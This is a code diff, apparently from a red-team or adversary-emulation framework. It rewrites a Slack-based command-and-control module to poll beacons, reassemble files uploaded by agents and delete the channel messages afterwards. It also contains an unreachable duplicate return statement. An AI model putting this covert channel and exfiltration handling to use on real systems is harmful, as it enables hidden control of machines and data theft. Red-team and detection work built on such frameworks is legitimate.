@@ -22,6 +22,27 @@ def api_access(func):
 
 class Contact(BaseWorld):
 
+    class SlackUpload:
+        def __init__(self, upload_id, filename, num_chunks):
+            self.upload_id = upload_id
+            self.filename = filename
+            self.chunks = [None]*num_chunks
+            self.required_chunks = num_chunks
+            self.completed_chunks = 0
+            self.exported = False
+
+        def add_chunk(self, chunk_index, contents):
+            if self.chunks[chunk_index] is None:
+                self.chunks[chunk_index] = contents
+                self.completed_chunks += 1
+
+        def is_complete(self):
+            return self.completed_chunks == self.required_chunks
+
+        def export_contents(self):
+            self.exported = True
+            return b''.join(self.chunks)
+
     def __init__(self, services):
         self.name = 'slack'
         self.description = 'Use slack for C2'
@@ -33,7 +54,7 @@ class Contact(BaseWorld):
         self.botid = ''
 
         # TODO
-        # Stores uploaded file chunks. Maps paw to dict that maps upload ID to GistUpload object
+        # Stores uploaded file chunks. Maps paw to dict that maps upload ID to SlackUpload object
         self.pending_uploads = defaultdict(lambda: dict())
 
     def retrieve_config(self):
@@ -52,7 +73,7 @@ class Contact(BaseWorld):
             await self.handle_beacons(await self.get_results())
             await self.handle_beacons(await self.get_beacons())
             # TODO
-            # await self.handle_uploads(await self.get_uploads())
+            await self.handle_uploads(await self.get_uploads())
             await asyncio.sleep(15)
 
     async def valid_config(self):
@@ -78,7 +99,6 @@ class Contact(BaseWorld):
         try:
             # Results are JSON dicts encoded in base64
             s = await self._get_slack_data(comm_type='results')
-            # self.log.debug(s)
             encoded_json_blobs = [g[0] for g in s]
             return [json.loads(self.file_svc.decode_bytes(blob)) for blob in encoded_json_blobs]
         except Exception as e:
@@ -93,7 +113,6 @@ class Contact(BaseWorld):
         try:
             # Beacons are JSON dicts encoded in base64
             s = await self._get_slack_data(comm_type='beacon')
-            # self.log.debug(s)
             b64_encoded_json_blobs = [g[0] for g in s]
             return [json.loads(self.file_svc.decode_bytes(blob)) for blob in b64_encoded_json_blobs]
         except Exception as e:
@@ -101,13 +120,14 @@ class Contact(BaseWorld):
             return []
 
     # TODO
-    async def handle_uploads(self, upload_gist_info):
-        for upload in upload_gist_info:
+    async def handle_uploads(self, upload_slack_info):
+        for upload in upload_slack_info:
+            self.log.debug("Handling upload...")
             file_contents = upload[0]
             metadata = upload[1].split(':')
             paw_info = upload[2].split('-')
             if len(paw_info) < 2 or len(metadata) < 5:
-                self.log.error('Parsing GIST upload data failed. Paw information not provided.')
+                self.log.error('Parsing SLACK upload data failed. Paw information not provided.')
                 return
             paw = paw_info[1]
             upload_id = metadata[1]
@@ -125,12 +145,12 @@ class Contact(BaseWorld):
     # TODO
     async def get_uploads(self):
         """
-        Retrieve all GIST posted file uploads for this C2's api key
-        :return: list of (raw content, gist description, gist filename) tuples for upload GISTs
+        Retrieve all SLACK posted file uploads for this C2's api key
+        :return: list of (raw content, slack description, slack filename) tuples for upload SLACKs
         """
         try:
-            upload_gists = await self._get_gist_data(comm_type='upload')
-            return [(b64decode(g[0]), g[2], g[3]) for g in upload_gists]
+            upload_slacks = await self._get_slack_content(comm_type='upload')
+            return [(b64decode(g[0]), g[1], g[2]) for g in upload_slacks]
         except Exception as e:
             self.log.error('Receiving file uploads over c2 (%s) failed: %s' % (self.__class__.__name__, e))
             return []
@@ -176,7 +196,7 @@ class Contact(BaseWorld):
         pending_upload = self.pending_uploads[paw].get(upload_id)
         if not pending_upload:
             # starting brand new upload
-            pending_upload = self.GistUpload(upload_id, filename, total_chunks)
+            pending_upload = self.SlackUpload(upload_id, filename, total_chunks)
             self.pending_uploads[paw][upload_id] = pending_upload
         pending_upload.add_chunk(curr_chunk - 1, contents)
 
@@ -193,17 +213,6 @@ class Contact(BaseWorld):
             await self.file_svc.save_file(unique_filename, upload_info.export_contents(), saveto_dir)
             self.log.debug('Uploaded file %s/%s' % (saveto_dir, upload_info.filename))
 
-    async def _get_raw_gist_info(self, comm_type):
-        """
-        Returns list of (gist url, gist ID, gist description, gist filename) tuples for gists matching the comm type.
-        """
-        return [(g['files'][file]['raw_url'], g['id'], g['description'], g['files'][file]['filename'])
-                for g in await self._get_gists() for file in g.get('files')
-                if comm_type in g['description']]
-
-    async def _get_gist_content(self, urls):
-        return [await self._fetch_content(url) for url in urls]
-
     async def _wait_for_paw(self, paw, comm_type):
         for message in await self._get_slack():
             if '{}-{}'.format(comm_type, paw) == message['text'].split(' | ')[0]:
@@ -215,37 +224,35 @@ class Contact(BaseWorld):
         await self._delete_slack_messages(timestamps=[i["ts"] for i in data])
         return [i["text"].split(" | ")[1:] for i in data]
 
+    async def _get_slack_content(self, comm_type):
+        data = await self._get_raw_slack_data(comm_type=comm_type)
+        await self._delete_slack_messages(timestamps=[i["ts"] for i in data])
+        return [
+            [await self._fetch_content(i["files"][0]["url_private"]),
+            i["text"].split(" | ")[1],
+            i["text"].split(" | ")[0]]
+            for i in data
+        ]
+        return [i["text"].split(" | ")[1:] for i in data]
+
     async def _get_raw_slack_data(self, comm_type):
         return [message for message in await self._get_slack()
                 if (("bot_id" in message and message["bot_id"] == self.botid) and
+                comm_type in message["text"].split(' | ')[0]) or (
+                    ("bot_id" not in message) and
                 comm_type in message["text"].split(' | ')[0])]
 
     @api_access
     async def _get_slack(self, session):
         s = json.loads(await self._fetch(session,
                                          'https://slack.com/api/conversations.history?channel={0}&oldest={1}'.format(self.channelid, int(time.time()-60))))
-        # self.log.debug(s)
         return s["messages"]
-
-    async def _get_gist_data(self, comm_type):
-        """
-        Returns list of (gist content, gist ID, gist description, gist filename) tuples for gists matching the comm
-        type.
-        """
-        gists = await self._get_raw_gist_info(comm_type=comm_type)
-        gist_data = [(await self._fetch_content(g[0]), g[1], g[2], g[3]) for g in gists]
-        await self._delete_gists(gist_ids=[g[1] for g in gists])
-        return gist_data
 
     async def _get_payload_content(self, payload, beacon):
         if payload in self.file_svc.special_payloads:
             f = await self.file_svc.special_payloads[payload](dict(file=payload, platform=beacon['platform']))
             return await self.file_svc.read_file(f)
         return await self.file_svc.read_file(payload)
-
-    @staticmethod
-    def _build_gist_content(comm_type, paw, files):
-        return dict(description='{}-{}'.format(comm_type, paw), public=False, files=files)
 
     def _build_slack_content(self, comm_type, paw, files):
         s = dict(channels=self.channelid, initial_comment='{}-{}'.format(comm_type, paw), content=files)
@@ -266,19 +273,6 @@ class Contact(BaseWorld):
     @api_access
     async def _post_slack_message(self, message_content, session):
         return await self._post(session, 'https://slack.com/api/chat.postMessage', body=message_content)
-
-    @api_access
-    async def _post_gist(self, gist_content, session):
-        return await self._post(session, 'https://api.github.com/gists', body=gist_content)
-
-    @api_access
-    async def _get_gists(self, session):
-        return json.loads(await self._fetch(session, 'https://api.github.com/gists'))
-
-    @api_access
-    async def _delete_gists(self, gist_ids, session):
-        for _id in gist_ids:
-            await self._delete(session, 'https://api.github.com/gists/{}'.format(_id))
 
     @api_access
     async def _delete_slack_messages(self, timestamps, session):
